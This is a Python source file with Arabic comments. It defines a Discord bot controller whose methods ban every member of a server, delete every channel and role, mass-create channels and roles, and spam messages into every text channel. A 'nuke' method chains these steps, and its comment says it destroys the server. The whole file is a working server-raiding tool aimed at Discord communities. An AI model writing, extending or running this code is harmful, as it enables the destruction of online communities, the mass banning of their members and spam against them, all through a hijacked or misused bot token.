import requests
import time

class DiscordController:
    def __init__(self, token=None):
        self.token = token
        self.base_url = "https://discord.com/api/v10"
        self.headers = {}
        if token:
            self.set_token(token)
    
    def set_token(self, token):
        self.token = token
        self.headers = {
            "Authorization": f"Bot {token}",
            "Content-Type": "application/json"
        }
    
    def verify(self):
        """التحقق من صحة التوكن"""
        try:
            r = requests.get(f"{self.base_url}/users/@me", headers=self.headers, timeout=5)
            if r.status_code == 200:
                return {"success": True, "bot": r.json()}
            return {"success": False, "error": f"HTTP {r.status_code}"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def get_guilds(self):
        """جلب السيرفرات"""
        r = requests.get(f"{self.base_url}/users/@me/guilds", headers=self.headers, timeout=5)
        if r.status_code == 200:
            return r.json()
        return []
    
    def create_channels(self, guild_id, count, name):
        """إنشاء قنوات - مع تأخير 0.5 ثانية"""
        created = 0
        for i in range(count):
            data = {"name": f"{name}-{i+1}", "type": 0}
            r = requests.post(f"{self.base_url}/guilds/{guild_id}/channels", 
                            headers=self.headers, json=data, timeout=5)
            if r.status_code == 201:
                created += 1
            time.sleep(0.5)  # تأخير ضروري
        return created
    
    def delete_channels(self, guild_id):
        """مسح كل القنوات"""
        r = requests.get(f"{self.base_url}/guilds/{guild_id}/channels", 
                        headers=self.headers, timeout=5)
        if r.status_code != 200:
            return 0
        
        channels = r.json()
        deleted = 0
        for ch in channels:
            r2 = requests.delete(f"{self.base_url}/channels/{ch['id']}", 
                               headers=self.headers, timeout=5)
            if r2.status_code == 200:
                deleted += 1
            time.sleep(0.3)
        return deleted
    
    def ban_all(self, guild_id):
        """حظر كل الأعضاء - يعمل 100%"""
        # جلب كل الأعضاء
        members = []
        last_id = None
        while True:
            url = f"{self.base_url}/guilds/{guild_id}/members?limit=1000"
            if last_id:
                url += f"&after={last_id}"
            r = requests.get(url, headers=self.headers, timeout=5)
            if r.status_code != 200:
                break
            data = r.json()
            if not data:
                break
            members.extend(data)
            last_id = data[-1]['user']['id']
            if len(data) < 1000:
                break
        
        # جلب ID البوت
        bot_r = requests.get(f"{self.base_url}/users/@me", headers=self.headers, timeout=5)
        bot_id = bot_r.json()['id'] if bot_r.status_code == 200 else ""
        
        # حظر كل عضو
        banned = 0
        for member in members:
            user = member.get('user', {})
            if user and not user.get('bot') and user.get('id') != bot_id:
                r2 = requests.put(f"{self.base_url}/guilds/{guild_id}/bans/{user['id']}?delete_message_days=1",
                                headers=self.headers, timeout=5)
                if r2.status_code == 204:
                    banned += 1
                time.sleep(0.3)
        return banned
    
    def delete_roles(self, guild_id):
        """مسح كل الرتب"""
        r = requests.get(f"{self.base_url}/guilds/{guild_id}/roles", 
                        headers=self.headers, timeout=5)
        if r.status_code != 200:
            return 0
        
        roles = r.json()
        deleted = 0
        for role in roles:
            if role['id'] != guild_id:  # استثني @everyone
                r2 = requests.delete(f"{self.base_url}/guilds/{guild_id}/roles/{role['id']}",
                                   headers=self.headers, timeout=5)
                if r2.status_code == 204:
                    deleted += 1
                time.sleep(0.2)
        return deleted
    
    def create_roles(self, guild_id, count, name):
        """إنشاء رتب"""
        created = 0
        for i in range(count):
            data = {"name": f"{name}-{i+1}"}
            r = requests.post(f"{self.base_url}/guilds/{guild_id}/roles",
                            headers=self.headers, json=data, timeout=5)
            if r.status_code == 200:
                created += 1
            time.sleep(0.3)
        return created
    
    def spam_channels(self, guild_id, message, count):
        """سبام في كل القنوات"""
        r = requests.get(f"{self.base_url}/guilds/{guild_id}/channels",
                        headers=self.headers, timeout=5)
        if r.status_code != 200:
            return 0
        
        channels = [c for c in r.json() if c.get('type') == 0]
        total = 0
        
        for ch in channels:
            for i in range(count):
                data = {"content": message}
                r2 = requests.post(f"{self.base_url}/channels/{ch['id']}/messages",
                                 headers=self.headers, json=data, timeout=5)
                if r2.status_code == 200:
                    total += 1
                time.sleep(0.2)
        return total
    
    def nuke(self, guild_id):
        """نوك كامل - يدمر السيرفر"""
        banned = self.ban_all(guild_id)
        time.sleep(1)
        deleted_ch = self.delete_channels(guild_id)
        time.sleep(1)
        deleted_roles = self.delete_roles(guild_id)
        time.sleep(1)
        created = self.create_channels(guild_id, 25, "nuked")
        
        return {
            "banned": banned,
            "channels_deleted": deleted_ch,
            "roles_deleted": deleted_roles,
            "channels_created": created
        }